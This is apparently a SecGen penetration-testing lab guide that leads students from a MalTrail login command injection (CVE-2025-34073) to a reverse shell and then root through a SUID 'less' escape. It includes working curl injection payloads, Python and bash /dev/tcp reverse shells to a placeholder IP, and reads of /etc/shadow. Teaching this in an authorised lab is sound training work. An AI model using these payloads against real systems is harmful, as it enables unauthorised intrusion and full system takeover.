# Lab: From Zero to Hero — MalTrail RCE to Root

## A Multi-Stage Penetration Testing Exercise

---

## 🎯 Learning Objectives

By completing this lab, you will be able to:

1. **Identify and exploit command injection vulnerabilities** in web applications
2. **Perform reconnaissance** to discover running services and potential attack vectors
3. **Establish a foothold** on a target system through remote code execution
4. **Enumerate the target environment** to find privilege escalation opportunities
5. **Escalate privileges** from an unprivileged user to root access
6. **Understand the full attack lifecycle** from initial access to complete system compromise

---

## 📖 Background: The MalTrail Vulnerability

### What is MalTrail?

MalTrail is an open-source malicious traffic detection system that monitors network traffic for suspicious activity. It consists of a sensor component (for packet capture) and a server component (for the web interface).

### The Vulnerability (CVE-2025-34073)

MalTrail versions 0.54 and earlier contain a **critical unauthenticated command injection vulnerability** in the login endpoint. The vulnerability exists because user-supplied input in the `username` parameter is passed directly to `subprocess.check_output()` without proper sanitization.

**CVSS Score: 10.0 (CRITICAL)**

| Property | Value |
|----------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Changed |
| Impact | High (Confidentiality, Integrity, Availability) |

### Why This Matters

This vulnerability demonstrates several important security concepts:

- **Input validation failures** can lead to complete system compromise
- **CWE-78: OS Command Injection** remains a prevalent vulnerability class
- **Defense in depth** is crucial — a single vulnerability shouldn't lead to total compromise

---

## 🎬 Scenario: The Shadow Network

### Your Mission

```
┌─────────────────────────────────────────────────────────────────┐
│                     CLASSIFIED BRIEFING                         │
├─────────────────────────────────────────────────────────────────┤
│ Operation: SHADOW NETWORK                                       │
│ Classification: CONFIDENTIAL                                    │
│                                                                 │
│ Intelligence reports indicate that a suspicious server has      │
│ appeared on the network at 192.168.1.100. The server appears    │
│ to be running some kind of network monitoring software.         │
│                                                                 │
│ Your task:                                                      │
│ 1. Investigate the target and identify running services         │
│ 2. Gain access to the system                                    │
│ 3. Escalate privileges to obtain full control                   │
│ 4. Retrieve the evidence files to complete the mission          │
│                                                                 │
│ Good luck, Agent. The clock is ticking.                        │
└─────────────────────────────────────────────────────────────────┘
```

You are a penetration tester conducting an authorized security assessment. Your target is a server running at **192.168.1.100** (or the IP provided by your instructor). Your goal is to achieve root access and retrieve the flag files.

---

## 🔧 Prerequisites

Before starting, ensure you have:

- [ ] A Kali Linux machine (or similar penetration testing environment)
- [ ] Network connectivity to the target (192.168.1.100)
- [ ] Basic familiarity with Linux command line
- [ ] Understanding of HTTP requests
- [ ] A web browser or tools like `curl`

---

## 📋 Phase 1: Reconnaissance

### Objective
Discover what services are running on the target system.

### Instructions

**Step 1.1: Check connectivity**

First, verify you can reach the target:

```bash
ping -c 3 192.168.1.100
```

**Step 1.2: Port scanning**

Use your favorite port scanner to identify open ports:

```bash
nmap -sV -sC -p- 192.168.1.100
```

<details>
<summary>💡 Hint 1: What ports should I look for?</summary>

Look for web services (typically ports 80, 443, 8080, 8338) and any unusual services. The `-sV` flag will help identify service versions.
</details>

<details>
<summary>💡 Hint 2: I found port 8338 — what is it?</summary>

Port 8338 is the default port for MalTrail's web interface. Try accessing it in your browser: `http://192.168.1.100:8338`
</details>

### Questions for Phase 1

1. What services are running on the target? List the port numbers and service names.
2. What version of MalTrail is running? How can you tell?
3. What other interesting information did the scan reveal?

---

## 📋 Phase 2: Initial Access

### Objective
Exploit the MalTrail command injection vulnerability to gain a foothold on the system.

### Background

The vulnerability exists in the `/login` endpoint. When you send a POST request with a specially crafted `username` parameter, you can inject shell commands.

### Instructions

**Step 2.1: Explore the web interface**

Visit `http://192.168.1.100:8338` in your browser. What do you see?

**Step 2.2: Test the login endpoint**

Try a normal login request:

```bash
curl -X POST http://192.168.1.100:8338/login -d "username=admin&password=admin"
```

What response do you get?

**Step 2.3: Test for command injection**

Now try injecting a command. In shell commands, the semicolon (`;`) allows you to chain commands:

```bash
curl -X POST http://192.168.1.100:8338/login -d "username=;id&password=test"
```

<details>
<summary>💡 Hint 1: What should I see?</summary>

If the vulnerability exists, the `id` command will execute on the server. Look for output like `uid=1000(maltrail) gid=1000(maltrail)` in the response.
</details>

<details>
<summary>💡 Hint 2: The command executed! What user am I?</summary>

You should see that you're running as the `maltrail` user. This is an unprivileged user account, but it's a start! Now you need to get a proper shell.
</details>

**Step 2.4: Get a reverse shell**

First, set up a listener on your Kali machine:

```bash
nc -lvnp 4444
```

Then, send a reverse shell payload. Try one of these:

```bash
# Python reverse shell
curl -X POST http://192.168.1.100:8338/login \
  -d "username=;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'&password=test"
```

Replace `YOUR_IP` with your Kali machine's IP address.

<details>
<summary>💡 Hint 3: Reverse shell not working?</summary>

Make sure:
1. Your listener is running (`nc -lvnp 4444`)
2. You replaced `YOUR_IP` with your actual IP
3. There's no firewall blocking the connection

Try a simpler test first: `username=;ping -c 1 YOUR_IP` and watch for ICMP packets with `tcpdump -i eth0 icmp`
</details>

<details>
<summary>💡 Hint 4: Alternative shell methods</summary>

If Python doesn't work, try:

```bash
# Bash reverse shell
curl -X POST http://192.168.1.100:8338/login \
  -d "username=;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'&password=test"

# Or use the full URL encoding
curl -X POST http://192.168.1.100:8338/login \
  --data-urlencode "username=;bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" \
  -d "password=test"
```
</details>

**Step 2.5: Stabilize your shell**

Once you have a shell, stabilize it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Questions for Phase 2

1. What made the command injection possible? What was not sanitized?
2. What user did you get access as? What are this user's privileges?
3. Why did we need a reverse shell instead of just running commands through curl?

---

## 📋 Phase 3: Post-Exploitation Enumeration

### Objective
Gather information about the system to find a path to root.

### Instructions

**Step 3.1: Basic system enumeration**

```bash
# Who are you?
id
whoami

# What system is this?
uname -a
cat /etc/os-release

# What users exist?
cat /etc/passwd
```

**Step 3.2: Look for interesting files**

```bash
# Check the maltrail user's home directory
ls -la /home/maltrail/
cat /home/maltrail/flag_*.txt 2>/dev/null

# Look for configuration files
ls -la /opt/maltrail/

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

<details>
<summary>💡 Hint 1: Found something interesting?</summary>

Pay close attention to the SUID binaries. SUID (Set User ID) allows a program to run with the permissions of its owner. If a program is SUID root, it runs as root regardless of who executes it!
</details>

<details>
<summary>💡 Hint 2: What SUID binaries should I look for?</summary>

Look for unusual SUID binaries, especially text editors, pagers, or utilities that can spawn shells. Common targets include:
- `less` 
- `more`
- `vim`
- `nano`
- `nmap` (older versions)
- `find`

Run `find / -perm -4000 -type f 2>/dev/null` and compare the output to a standard Linux installation.
</details>

**Step 3.3: Check sudo privileges**

```bash
sudo -l
```

<details>
<summary>💡 Hint 3: What does sudo -l show?</summary>

This command shows what commands the current user can run with sudo. If you see something like `(root) NOPASSWD: /usr/bin/less`, you can run less as root without a password!
</details>

### Questions for Phase 3

1. What SUID binaries did you find that are unusual?
2. Did you find any flag files? Where were they?
3. What potential privilege escalation vectors did you identify?

---

## 📋 Phase 4: Privilege Escalation

### Objective
Escalate from the `maltrail` user to root access.

### Instructions

**Step 4.1: Exploit the SUID binary**

If you found an unusual SUID binary (like `less`), you can use it to escalate privileges:

```bash
# Check if less is SUID
ls -la /usr/bin/less

# If it's SUID root, you can exploit it
less /etc/shadow
```

**Step 4.2: Get a root shell from less**

Inside `less`, you can spawn a shell:

```bash
# Start less on any file
less /etc/passwd

# Inside less, type:
!/bin/sh
```

Press Enter, and you should have a root shell!

<details>
<summary>💡 Hint 1: Why does this work?</summary>

When `less` is SUID root, it runs as root. The `!` command in less executes a shell command. Since less is running as root, the shell it spawns is also root!
</details>

<details>
<summary>💡 Hint 2: Alternative methods</summary>

If `!/bin/sh` doesn't work, try:
- `!bash`
- `!/bin/bash`
- Press `v` to open the default editor (might be vi), then `:!/bin/sh`

You can also use GTFOBins (https://gtfobins.github.io/) to find exploitation methods for various binaries.
</details>

**Step 4.3: Verify root access**

```bash
id
whoami
```

You should see `uid=0(root) gid=0(root)`.

**Step 4.4: Capture the final flag**

```bash
# Look for root's flag
cat /root/flag_*.txt 2>/dev/null
ls -la /root/
```

### Questions for Phase 4

1. What was the SUID binary that allowed privilege escalation?
2. Why is it dangerous to have SUID binaries that can execute commands?
3. How could this misconfiguration be prevented?

---

## 🏆 Challenge Questions

### Beginner

1. What is the CVE identifier for the MalTrail vulnerability?
2. What HTTP method is used to exploit the vulnerability?
3. What parameter is vulnerable to command injection?

### Intermediate

4. Explain why input sanitization is important. What characters should be filtered?
5. What is the difference between a reverse shell and a bind shell?
6. Why do we need to stabilize our shell after getting a reverse connection?

### Advanced

7. How would you modify the MalTrail code to fix this vulnerability?
8. What defense-in-depth measures could prevent this attack chain?
9. Research and explain three methods to detect this attack on a production system.

### Expert

10. Write a Metasploit module for this vulnerability (pseudo-code is acceptable)
11. How would you pivot from this machine to attack other systems on the network?
12. Design a monitoring solution that would alert on this type of exploitation attempt

---

## 📝 Lab Report Template

Complete this template as you work through the lab:

```
PENETRATION TEST REPORT
=======================

Target: 192.168.1.100
Date: [DATE]
Tester: [YOUR NAME]

1. EXECUTIVE SUMMARY
   - Brief overview of findings
   - Risk assessment

2. RECONNAISSANCE
   - Services discovered
   - Versions identified

3. VULNERABILITY ANALYSIS
   - Vulnerabilities found
   - CVE references
   - CVSS scores

4. EXPLOITATION
   - Steps taken
   - Tools used
   - Access gained

5. POST-EXPLOITATION
   - Information gathered
   - Privilege escalation path

6. RECOMMENDATIONS
   - Immediate fixes
   - Long-term improvements

7. FLAGS CAPTURED
   - Flag 1: [VALUE]
   - Flag 2: [VALUE]
   - Root flag: [VALUE]
```

---

## 🔒 Defensive Considerations

After completing this lab, consider:

1. **How could this attack have been prevented?**
   - Input validation in the application
   - Running services with minimal privileges
   - Proper file permissions (no unnecessary SUID binaries)

2. **How could this attack have been detected?**
   - Web application firewall (WAF) rules
   - Log monitoring for unusual requests
   - File integrity monitoring for SUID changes

3. **What should the incident response be?**
   - Isolate the affected system
   - Preserve evidence
   - Patch or update the vulnerable software
   - Review for persistence mechanisms

---

## 📚 Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [CVE-2025-34073 Details](https://nvd.nist.gov/vuln/detail/CVE-2025-34073)

---

## 🎓 Instructor Notes

### Scenario Configuration

This lab requires a SecGen scenario combining:
- `modules/vulnerabilities/unix/http/maltrail_rce` (initial access)
- `modules/vulnerabilities/unix/access_control_misconfigurations/suid_root_less` (privilege escalation)

### Expected Timeline

| Phase | Duration |
|-------|----------|
| Reconnaissance | 15-20 minutes |
| Initial Access | 20-30 minutes |
| Enumeration | 15-20 minutes |
| Privilege Escalation | 15-20 minutes |
| Documentation | 20-30 minutes |
| **Total** | **85-120 minutes** |

### Common Issues

1. **Reverse shell not connecting**: Check firewall rules and ensure the student's IP is correct
2. **Shell dies immediately**: Use a stabilized shell method
3. **Can't find SUID binary**: Ensure the scenario includes the privilege escalation module

### Learning Verification

Students should demonstrate:
- [ ] Successful port scanning and service identification
- [ ] Understanding of command injection exploitation
- [ ] Ability to establish a reverse shell
- [ ] Proper enumeration techniques
- [ ] Successful privilege escalation
- [ ] Complete documentation of the attack chain

---

*Lab created for SecGen — A Security Scenario Generator*
*For educational purposes only. Always obtain proper authorization before testing.*
